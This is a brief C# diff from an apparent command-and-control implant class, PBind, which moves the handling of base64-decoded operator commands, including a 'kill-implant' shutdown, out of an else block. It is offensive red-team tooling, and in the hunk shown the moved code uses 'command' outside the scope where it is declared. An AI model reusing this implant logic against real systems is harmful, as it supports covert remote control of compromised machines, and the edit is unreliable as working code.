@@ -65,16 +65,16 @@ public class PBind
             } else {
                 byte[] data = Convert.FromBase64String(args[0]);
                 string command = Encoding.UTF8.GetString(data);
-                if (command.ToLower().Trim() == "kill-implant")
-                {
-                    pbindConnected = false;
-                    IssueCommand(command);
-                    pipe.Dispose();
-                }
-                else
-                {
-                    IssueCommand(command);
-                }
+            }
+            if (command.ToLower().Trim() == "kill-implant")
+            {
+                pbindConnected = false;
+                IssueCommand(command);
+                pipe.Dispose();
+            }
+            else
+            {
+                IssueCommand(command);
             }
         }
         else
